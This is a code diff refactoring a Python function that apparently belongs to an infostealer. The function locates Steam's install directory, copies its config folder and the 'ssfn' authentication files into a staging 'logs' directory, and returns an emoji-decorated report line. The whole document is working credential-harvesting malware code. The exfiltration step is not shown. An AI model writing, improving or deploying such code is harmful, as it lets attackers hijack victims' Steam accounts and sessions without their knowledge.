@@ -1,4 +1,5 @@
-from os import environ,path,listdir
+from os import listdir
+from os.path import join, isfile
 from shutil import copytree,copy
 from manager.logger import Log
 from preferences.config import config
@@ -6,36 +7,18 @@ from preferences.config import config
 
 
 def Steam():
-    path2 = r'C:\Program Files\Steam'
-    path02 = r'C:\Program Files\Steam\config'
-    path3 = r'C:\Program Files (x86)\Steam'
-    path03 = r'C:\Program Files (x86)\Steam\config'
+    main_path = "C:\\Program Files (x86)\\Steam"
+    config_path = join(main_path, "config")
+    dest_main = join(config.pathToLogs, "Games", "Steam")
+    dest_config = join(dest_main, "config")
+
     try:
-        msgInfo = ""
-        msgInfo+="\n\n<b>🕹Games🕹</b>"
+        msgInfo = "\n\n<b>🕹Games🕹</b>"
         Log("===========Games===========")
-        try:
-            pathtofile = config.pathToLogs
-            directory = f'{pathtofile}\\Games\\Steam\\config'
-            directory2 = f'{pathtofile}\\Games\\Steam'
-            files2 = [i for i in listdir(path2) if path.isfile(path.join(path2,i)) and \
-            'ssfn' in i]
-            copytree(path02, directory)
-            copy(path2+'\\'+files2[0], directory2)
-            copy(path2+'\\'+files2[1], directory2)
-        except Exception as error:
-            Log(f"Steam ---> {error}")
-        try:
-            files3 = [i for i in listdir(path3) if path.isfile(path.join(path3,i)) and \
-            'ssfn' in i]
-            copytree(path03, directory)
-            copy(path3+'\\'+files3[0], directory2)
-            copy(path3+'\\'+files3[1], directory2)
-        except Exception as error:
-            Log(f"Steam(x86) ---> {error}")
+        auth_files = [item for item in listdir(main_path) if isfile(join(main_path, item)) and item.startswith("ssfn")]
+        copytree(config_path, dest_config)
+        for file in auth_files: copy(join(main_path, file), dest_main)
         msgInfo+="\n∟🎮Steam"
         return msgInfo
-    except Exception as error:
-        Log(f"Steam(global) ---> {error}")
-        return msgInfo
-
+    except Exception as e: Log(f"Steam ---> {e}")
+    return msgInfo
